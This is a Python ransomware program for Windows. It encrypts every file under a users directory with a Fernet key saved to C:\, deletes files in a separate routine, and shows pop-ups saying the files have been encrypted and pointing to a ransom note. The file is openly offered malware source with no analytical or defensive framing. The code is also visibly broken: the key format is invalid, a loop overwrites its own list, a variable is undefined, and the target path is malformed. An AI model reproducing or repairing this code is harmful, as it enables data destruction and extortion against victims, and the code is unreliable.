import os
import secrets
import string
import win32api
import win32gui
import cryptography
import cryptography.fernet
import json
import pathlib
import tkinter as tk
import tkinter.font as tkFont
from pathlib import Path

def generate_key():
    alphabetChars = string.ascii_letters + string.digits
    key = ''.join(secrets.choice(alphabetChars) for i in range(32))
    return key

def create_key_file(key):
    with open(r"C:\encryptor_key.txt", "w") as key_file:
        json.dump(key, key_file)

def get_key_from_file():
    if os.path.exists(r"C:\encryptor_key.txt"):
        with open(r"C:\encryptor_key.txt", "r") as key_file:
            return json.load(key_file)

def ransom_note_generator(directory, note_file="ransom_note.txt"):
    if not os.path.exists(directory):
        raise Exception(f"{directory} does not exist.")

    files = []

    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.abspath(os.path.join(directory, file))
            if "." in file:
                files.append(file_path)

    for file_path in files:
        ransom_note_data = read_ransom_note_file()
        if file_path in ransom_note_data:
            os.remove(file_path)
        else:
            with open(file_path, "r") as file:
                data = file.read()
                data_length = len(data)

                ransom_note_data["RANSOM_NOTE"] = file_path
                write_ransom_note_file(ransom_note_data)

                print(f"Removing {file_path}")
                os.remove(file_path)
                win32api.MessageBox(0, "Your files have been encrypted.\nFor instructions on how to decrypt your files, see the ransom note.\nPress OK to view the ransom note.", "Ransomware!")

def read_ransom_note_file():
    if not os.path.exists(r"C:\ransom_note.txt"):
        return {}

    with open(r"C:\ransom_note.txt", "r") as note_file:
        data = json.load(note_file)

    return data

def write_ransom_note_file(data):
    with open(r"C:\ransom_note.txt", "w") as note_file:
        json.dump(data, note_file)

def encrypt_files(directory, key):
    encrypted_files = {}



    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.abspath(os.path.join(directory, file))
            if "RANSOM_NOTE" not in file_path:
                print(f"Encrypting: {file_path}")
                with open(file_path, "rb") as original_file:
                    data = original_file.read()
                encrypted_data = encrypt(key, data)
                encrypted_files[file] = encrypted_data
                with open(file_path, "wb") as encrypted_file:
                    encrypted_file.write(encrypted_data)

    return encrypted_files

def encrypt(key, data):
    f = cryptography.fernet.Fernet(key)
    encrypted_data = f.encrypt(data)
    return encrypted_data

def main():

    # Generate a random key
    key = generate_key()

    # Save the key to a file
    create_key_file(key)

    # Start the GUI
    window = tk.Tk()
    # Set the window title
    window.title("DirRansomware!")

    # Set the window size
    window.geometry("400x120")

    # Define the font
    font = tkFont.Font(
        family="Calibri", size=14, weight="bold"
    )

    # Create a label
    label = tk.Label(
        window,
        text="Ransomware in Action!",
        bg="#F44343",
        fg="white",
        font=font,
    )

    # Create an encrypt button
    encryptBtn = tk.Button(
        window,
        text="Encrypt Files",
        command=lambda: encrypt_files(r"C:users", get_key_from_file()),
        width=50,
        font=font,
    )

    # Place the widgets
    label.place(x=10, y=60)
    encryptBtn.place(x=30, y=70)

    # Create a ransom note file if it doesn't exist
    ransom_note_data = read_ransom_note_file()
    if not ransom_note_data:
        ransom_note_data = {"RANSOM_NOTE": ""}
        write_ransom_note_file(ransom_note_data)

    # Function to update the ransom note when the user presses the Encrypt Files button
    encryptBtn["command"] = lambda: update_ransom_note_and_encrypt(encryptBtn)

    # Start the tkinter event loop
    window.mainloop()

def update_ransom_note_and_encrypt(button):
    ransom_note_data = read_ransom_note_file()
    for note_file in ransom_note_data:
        win32api.MessageBox(0, f"The file {note_file} has been encrypted.\nPress OK to view the updated ransom note.", "DirRansomware!")

    ransom_note_data = update_ransom_note_data(ransom_note_data)
    write_ransom_note_file(ransom_note_data)
    button["command"] = lambda: encrypt_files(r"C:users", get_key_from_file())

def update_ransom_note_data(data):
    for note_file in data:
        if data[note_file] != r"C:\ransom_note.txt":
            # Update the ransom_note_data for the file
            file_path = Path(data[note_file]).with_suffix(".txt")
            ransom_note_data[file_path] = r"C:\ransom_note.txt"
    return ransom_note_data

if __name__ == "__main__":
    main()